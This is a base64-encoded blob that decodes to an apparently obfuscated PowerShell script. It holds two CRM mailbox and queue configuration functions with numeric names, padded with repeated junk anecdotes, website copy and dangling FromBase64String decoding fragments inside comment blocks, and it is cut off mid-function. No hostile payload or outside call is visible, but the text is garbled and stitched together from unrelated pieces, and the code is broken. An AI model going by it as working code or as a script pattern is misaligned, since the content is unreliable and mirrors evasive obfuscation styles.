gSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGYoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgRGVkaWNhdGlvblNvdXJjZSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiAyMCB7CgogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBBUkFNKAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtU2VydmljZUNsaWVudF0kY29ubiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MSldCiAgICAgICAgW3N0cmluZ10kVXNlcklkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW3N0cmluZ10kRW1haWxBZGRyZXNzLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iQ3VzdG9tIildICAgICAgICAKICAgICAgICBbZ3VpZF0kRW1haWxTZXJ2ZXJQcm9maWxlLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iQ3VzdG9tIildCiAgICAgICAgW2ludF0kSW5jb21pbmdFbWFpbERlbGl2ZXJ5TWV0aG9kLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iQ3VzdG9tIildCiAgICAgICAgW2ludF0kT3V0Z29pbmdFbWFpbERlbGl2ZXJ5TWV0aG9kLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iQ3VzdG9tIildCiAgICAgICAgW2ludF0kQUNURGVsaXZlcnlNZXRob2QsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJEZWZhdWx0IildCiAgICAgICAgW3N3aXRjaF0kQXBwbHlEZWZhdWx0RW1haWxTZXR0aW5ncywKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UsIFBhcmFtZXRlclNldE5hbWU9IlN0YXR1cyIpXQogICAgICAgIFtzdHJpbmddJFN0YXRlQ29kZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UsIFBhcmFtZXRlclNldE5hbWU9IlN0YXR1cyIpXQogICAgICAgIFtzdHJpbmddJFN0YXR1c0NvZGUsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJTdGF0dXMiKV0KICAgICAgICBbc3dpdGNoXSRTY2hlZHVsZVRlc3QsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJTdGF0dXMiKV0KICAgICAgICBbc3dpdGNoXSRNYXJrZWRBc1ByaW1hcnlGb3JFeGNoYW5nZVN5bmMsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJTdGF0dXMiKV0KICAgICAgICBbc3dpdGNoXSRBcHByb3ZlRW1haWwKICAgICkKCSRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkKCiAgICAkZmV0Y2ggPSBAIgo8ZmV0Y2ggdmVyc2lvbj0iMS4wIiBvdXRwdXQtZm9ybWF0PSJ4bWwtcGxhdGZvcm0iIG1hcHBpbmc9ImxvZ2ljYWwiIGRpc3RpbmN0PSJmYWxzZSIgbm8tbG9jaz0idHJ1ZSI+CiAgPGVudGl0eSBuYW1lPSJtYWlsYm94Ij4KICAgIDxhdHRyaWJ1dGUgbmFtZT0ibWFpbGJveGlkIiAvPgogICAgPGZpbHRlciB0eXBlPSJhbmQiPgogICAgICA8Y29uZGl0aW9uIGF0dHJpYnV0ZT0icmVnYXJkaW5nb2JqZWN0aWQiIG9wZXJhdG9yPSJlcSIgdmFsdWU9InskVXNlcklkfSIgLz4KICAgIDwvZmlsdGVyPgogIDwvZW50aXR5Pgo8L2ZldGNoPgoiQAoKICAgICRJZCA9IChHZXQtQ3JtUmVjb3Jkc0J5RmV0Y2ggLWNvbm4gJGNvbm4gLUZldGNoICRmZXRjaCkuQ3JtUmVjb3Jkc1swXS5NYWlsYm94SWQKCiAgICAkdXBkYXRlRmllbGRzID0gQHt9CiAgICBpZigkQXBwbHlEZWZhdWx0RW1haWxTZXR0aW5ncykKICAgIHsKICAgICAgICAkZmV0Y2ggPSBAIgogICAgICAgIDxmZXRjaCB2ZXJzaW9uPSIxLjAiIG91dHB1dC1mb3JtYXQ9InhtbC1wbGF0Zm9ybSIgbWFwcGluZz0ibG9naWNhbCIgZGlzdGluY3Q9ImZhbHNlIiBuby1sb2NrPSJ0cnVlIj4KICAgICAgICAgICAgPGVudGl0eSBuYW1lPSJvcmdhbml6YXRpb24iPgogICAgICAgICAgICAgICAgPGF0dHJpYnV0ZSBuYW1lPSJkZWZhdWx0ZW1haWxzZXJ2ZXJwcm9maWxlaWQiIC8+ICAgICAgIAogICAgICAgICAgICAgICAgPGF0dHJpYnV0ZSBuYW1lPSJkZWZhdWx0ZW1haWxzZXR0aW5ncyIgLz4gICAgICAgICAgICAKICAgICAgICAgICAgPC9lbnRpdHk+CiAgICAgICAgPC9mZXRjaD4KIkAKICAgICAgICAkcmVjb3JkID0gKEdldC1Dcm1SZWNvcmRzQnlGZXRjaCAtY29ubiAkY29ubiAtRmV0Y2ggJGZldGNoKS5Dcm1SZWNvcmRzWzBdCiAgICAgICAgJHVwZGF0ZUZpZWxkcy5BZGQoImVtYWlsc2VydmVycHJvZmlsZSIsICRyZWNvcmQuZGVmYXVsdGVtYWlsc2VydmVycHJvZmlsZWlkX1Byb3BlcnR5LlZhbHVlKQogICAgICAgICR4bWwgPSBbeG1sXSRyZWNvcmQuZGVmYXVsdGVtYWlsc2V0dGluZ3MKICAgICAgICAkdXBkYXRlRmllbGRzLkFkZCgiaW5jb21pbmdlbWFpbGRlbGl2ZXJ5bWV0aG9kIiwgKE5ldy1Dcm1PcHRpb25TZXRWYWx1ZSAkeG1sLkNoaWxkTm9kZXMuSW5jb21pbmdFbWFpbERlbGl2ZXJ5TWV0aG9kKSkKICAgICAgICAkdXBkYXRlRmllbGRzLkFkZCgib3V0Z29pbmdlbWFpbGRlbGl2ZXJ5bWV0aG9kIiwgKE5ldy1Dcm1PcHRpb25TZXRWYWx1ZSAkeG1sLkNoaWxkTm9kZXMuT3V0Z29pbmdFbWFpbERlbGl2ZXJ5TWV0aG9kKSkKICAgICAgICAkdXBkYXRlRmllbGRzLkFkZCgiYWN0ZGVsaXZlcnltZXRob2QiLCAoTmV3LUNybU9wdGlvblNldFZhbHVlICR4bWwuQ2hpbGROb2Rlcy5BQ1REZWxpdmVyeU1ldGhvZCkpCiAgICB9CiAgICBpZigkU2NoZWR1bGVUZXN0KQogICAgewogICAgICAgICR1cGRhdGVGaWVsZHMuQWRkKCJ0ZXN0ZW1haWxjb25maWd1cmF0aW9uc2NoZWR1bGVkIiwgJHRydWUpCiAgICB9CiAgICBpZigkTWFya2VkQXNQcmltYXJ5Rm9yRXhjaGFuZ2VTeW5jKQogICAgewogICAgICAgICR1cGRhdGVGaWVsZHMuQWRkKCJvcmdtYXJrZWRhc3ByaW1hcnlmb3JleGNoYW5nZXN5bmMiLCAkdHJ1ZSkKICAgIH0KICAgIGlmKCRBcHByb3ZlRW1haWwpCiAgICB7CiAgICAgICAgQXBwcm92ZS1Dcm1FbWFpbEFkZHJlc3MgLWNvbm4gJGNvbm4gLVVzZXJJZCAkVXNlcklkCiAgICB9CiAgICBmb3JlYWNoKCRwYXJhbWV0ZXIgaW4gJE15SW52b2NhdGlvbi5Cb3VuZFBhcmFtZXRlcnMuR2V0RW51bWVyYXRvcigpKQogICAgeyAgIAogICAgICAgIGlmKCRwYXJhbWV0ZXIuS2V5IC1pbiAoIkVtYWlsU2VydmVyUHJvZmlsZSIpKQogICAgICAgIHsKICAgICAgICAgICAgJHVwZGF0ZUZpZWxkcy5BZGQoJHBhcmFtZXRlci5LZXkuVG9Mb3dlcigpLCAoTmV3LUNybUVudGl0eVJlZmVyZW5jZSBlbWFpbHNlcnZlcnByb2ZpbGUgJHBhcmFtZXRlci5WYWx1ZSkpCiAgICAgICAgfQogICAgICAgIGVsc2VpZigkcGFyYW1ldGVyLktleSAtaW4gKCJJbmNvbWluZ0VtYWlsRGVsaXZlcnlNZXRob2QiLCJPdXRnb2luZ0VtYWlsRGVsaXZlcnlNZXRob2QiLCJBQ1REZWxpdmVyeU1ldGhvZCIpKQogICAgICAgIHsKICAgICAgICAgICAgJHVwZGF0ZUZpZWxkcy5BZGQoJHBhcmFtZXRlci5LZXkuVG9Mb3dlcigpLCAoTmV3LUNybU9wdGlvblNldFZhbHVlICRwYXJhbWV0ZXIuVmFsdWUpKQogICAgICAgIH0KICAgICAgICBlbHNlaWYoJHBhcmFtZXRlci5LZXkgLWluICgiU3RhdGVDb2RlIiwiU3RhdHVzQ29kZSIpKQogICAgICAgIHsKICAgICAgICAgICAgU2V0LUNybVJlY29yZFN0YXRlIC1jb25uICRjb25uIC1FbnRpdHlMb2dpY2FsTmFtZSBtYWlsYm94IC1JZCAkSWQgLVN0YXRlQ29kZSAkU3RhdGVDb2RlIC1TdGF0dXNDb2RlICRTdGF0dXNDb2RlCiAgICAgICAgfQogICAgICAgIGVsc2VpZigkcGFyYW1ldGVyLktleSAtaW4gKCJFbWFpbEFkZHJlc3MiKSkKICAgICAgICB7CiAgICAgICAgICAgICR1cGRhdGVGaWVsZHMuQWRkKCRwYXJhbWV0ZXIuS2V5LlRvTG93ZXIoKSwgJHBhcmFtZXRlci5WYWx1ZSkKICAgICAgICB9CiAgICB9CgogICAgU2V0LUNybVJlY29yZCAtY29ubiAkY29ubiAtRW50aXR5TG9naWNhbE5hbWUgbWFpbGJveCAtSWQgJElkIC1GaWVsZHMgJHVwZGF0ZUZpZWxkcwp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBkKCkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgZCgpIG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNyZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBmKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIERlZGljYXRpb25Tb3VyY2UgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gMjEgewoKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSgKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEpXQogICAgICAgIFtzdHJpbmddJFF1ZXVlSWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbc3RyaW5nXSRFbWFpbEFkZHJlc3MsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJDdXN0b20iKV0gICAgICAgIAogICAgICAgIFtndWlkXSRFbWFpbFNlcnZlclByb2ZpbGUsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJDdXN0b20iKV0KICAgICAgICBbaW50XSRJbmNvbWluZ0VtYWlsRGVsaXZlcnlNZXRob2QsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJDdXN0b20iKV0KICAgICAgICBbaW50XSRPdXRnb2luZ0VtYWlsRGVsaXZlcnlNZXRob2QsCiAgICAgICAgW3BhcmFt